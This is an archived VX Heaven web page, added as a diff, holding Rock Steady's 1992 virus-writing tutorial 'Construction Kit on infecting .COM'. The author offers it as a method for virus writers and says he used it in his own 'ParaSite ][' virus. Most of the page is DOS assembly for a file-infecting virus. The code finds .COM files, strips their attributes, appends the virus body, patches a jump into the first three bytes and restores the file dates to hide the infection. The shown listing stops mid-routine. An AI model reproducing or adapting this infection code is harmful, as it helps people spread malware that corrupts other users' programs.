@@ -1,0 +1,216 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> Rock Steady 'Construction Kit on infecting .COM' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="Rock Steady"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Rock Steady,Construction Kit on infecting .COM, time, attributes, bytes, date, filename, write, found, save, jump, simple, virlength, files, read, source, beginning"/>
+<meta name="Description" content="Well I must state my opinion that there are certainly WAY too many overwriting viruses out here. To help put a Stop to this I will try to explain to you a SIMPLE way to infect COM files at the END of the Program."/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"670162cbcef57455219dc7a863219993f8bde77d-1498755951-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vrs01.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>Construction Kit on infecting .COM</h1><p><a href="/lib/?lang=en&amp;author=Rock%20Steady"> Rock Steady</a><br/> <em><a href="/vx.php?fid=336#f336">Nuke Info Journal [2]</a></em><br/> <em>February 1992</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vrs01.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=DO#vrs01">Back to index</a>] [<a href="/lib/vrs01.html#disqus_thread">Comments</a>]<br/> 
+<p>Well I must state my opinion that there are certainly <strong>way</strong> too many overwriting viruses out here. To help put a Stop to this I will try to explain to you a SIMPLE way to infect COM files at the <strong>end</strong> of the Program. This routine <strong>works</strong> if you follow my steps correctly, and I've already used this in my `ParaSite ][' Virus.</p>
+<p>Anyhow this is a brief description what the ASM Source will do.</p>
+<ol>
+<li>Find a .COM file in the current Directory</li>
+<li>Save the Date and File's Attribute.</li>
+<li>Save the First 3 Bytes in a Stack</li>
+<li>Infect the File &amp; restore new 3 bytes..</li>
+<li>Put the OLD date and File Attributes back on</li>
+</ol>
+<h2>Beginning...</h2>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp;<span style="color: black; font-style: italic;">;----------------------------------------------------------------------</span><br/>
+&nbsp;<span style="color: black; font-style: italic;">; The Simple routine to Search for a .COM File...</span><br/>
+&nbsp;<span style="color: black; font-style: italic;">;----------------------------------------------------------------------</span><br/>
+&nbsp;com_files &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> &nbsp; &nbsp; &nbsp;<span style="color: #7f007f;">&quot;*.com&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4eh</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;point to a *.COM file...</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>com_files<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;Attributes with ReadOnly or Hidden</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;is A okay...</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">12h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;Any files found?</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">je</span> &nbsp; &nbsp; &nbsp;exit &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;If no Files found Exit...</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; found_file<br/>
+&nbsp;<span style="color: black; font-style: italic;">; Instead of Exiting here you can make the Virus go and change dir and</span><br/>
+&nbsp;<span style="color: black; font-style: italic;">; look for several other .com files else where... with the help of the</span><br/>
+&nbsp;<span style="color: black; font-style: italic;">; path or simply searching for more &amp;lt;dir&amp;gt;...</span><br/>
+<br/>
+&nbsp;found_file<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">+</span>file<span style="color: black;">&#93;</span> <span style="color: black; font-style: italic;">;di points to the filename</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">si</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span>file &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;si points to filename...</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>offset <span style="color: #ff0000;">4300h</span> &nbsp;<span style="color: black; font-style: italic;">;get file Attributes...</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">si</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;filename in dx..</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; file_attrib<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cx</span> &nbsp; <span style="color: black; font-style: italic;">;Save file Attributes.</span><br/>
+<br/>
+&nbsp;file &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dw</span> &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">0</span><br/>
+&nbsp;<span style="color: black; font-style: italic;">; Here we'll set the file attributes to nothing</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>offset <span style="color: #ff0000;">4301h</span> &nbsp; &nbsp;<span style="color: black; font-style: italic;">;To set file Attributes...</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>offset <span style="color: #ff0000;">0fffeh</span> &nbsp; <span style="color: black; font-style: italic;">;Set them to a Normal File</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">si</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;filename...</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>offset <span style="color: #ff0000;">3d02h</span> &nbsp; &nbsp;<span style="color: black; font-style: italic;">;Open File to Read/Write.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">si</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;ASCIIZ filename</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jnb</span> &nbsp; &nbsp; ok &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;If file was open continue</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; put_old_attrib &nbsp; &nbsp; <span style="color: black; font-style: italic;">; error happened restore old attribs</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; and quit.</span><br/>
+&nbsp;ok<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>offset <span style="color: #ff0000;">5700h</span> &nbsp; &nbsp;<span style="color: black; font-style: italic;">;Get File Date &amp;amp; Time...</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; old_time<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cx</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;Save old File Time...</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; old_date<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;Save old File Date</span><br/>
+<br/>
+&nbsp;old_time &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">0</span><br/>
+&nbsp;old_date &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">0</span><br/>
+<br/>
+&nbsp;<span style="color: black; font-style: italic;">; here we infect the file... but first we SAVE the first 3 bytes</span><br/>
+&nbsp;<span style="color: black; font-style: italic;">; somewhere in our virus</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3fh</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;Read file...</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;Number of bytes to read</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>first_3 &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;Save bytes in the buffer</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">si</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Filename...</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;Where 3 bytes read?</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; fix_file &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;If not fix file like before and quit</span><br/>
+<br/>
+&nbsp;first_3 &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">equ</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">$</span> &nbsp; &nbsp;<span style="color: black; font-style: italic;">; The First three bytes of the Original File!</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">20h</span> &nbsp;<span style="color: black; font-style: italic;">; the virus is infected to.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">nop</span><br/>
+<br/>
+&nbsp;<span style="color: black; font-style: italic;">; This moves the File pointer to the END of the file</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>offset <span style="color: #ff0000;">4202h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;DX:AX is the FILESIZE!</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;subtract three because of file pointer</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>offset c_len_y<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">si</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span>offset c_len_x<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">di</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cx</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;Modifies the 2nd &amp;amp; 3rd bytes of program</span><br/>
+<br/>
+&nbsp;<span style="color: black; font-style: italic;">; The writes our virus to the file</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">40h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>virlength &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;Virus Length</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">si</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;File...</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>offset codelength &nbsp;<span style="color: black; font-style: italic;">;Length of virus codes.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>offset virlength &nbsp; <span style="color: black; font-style: italic;">;all bytes written?</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; fix_file &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;If no fix file and quit</span><br/>
+<br/>
+&nbsp;<span style="color: black; font-style: italic;">;Moves the file pointer to the beginning of file and write the</span><br/>
+&nbsp;<span style="color: black; font-style: italic;">;3 bytes JMP at the beginning of the file</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>offset <span style="color: #ff0000;">4200h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">40h</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Write to file...</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;# of bytes to write...</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">si</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;File name...</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>jump &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;Point to the new JMP statement</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
+<br/>
+&nbsp;jump &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">0e9h</span> &nbsp; &nbsp;<span style="color: black; font-style: italic;">;This is the JMP that will be put in the</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;Begining of the file!</span><br/>
+<br/>
+&nbsp;<span style="color: black; font-style: italic;">;Restore Old File Time &amp;amp; Date</span><br/>
+<br/>
+&nbsp;fix_file<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span>old_date &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Old File Date</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>old_time &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Old file Time...</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span>offset <span style="color: #ff0000;">0ffe0h</span> <span style="color: black; font-style: italic;">;Flat Attribs.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>offset <span style="color: #ff0000;">5701h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3eh</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Close file...</span><br/>
+<br/>
+<br/>
+&nbsp;<span style="color: black; font-style: italic;">; Here we'll restore the old file attributes...</span><br/>
+<br/>
+&nbsp;put_old_attrib<span style="color: #339933;">:</span><br/>
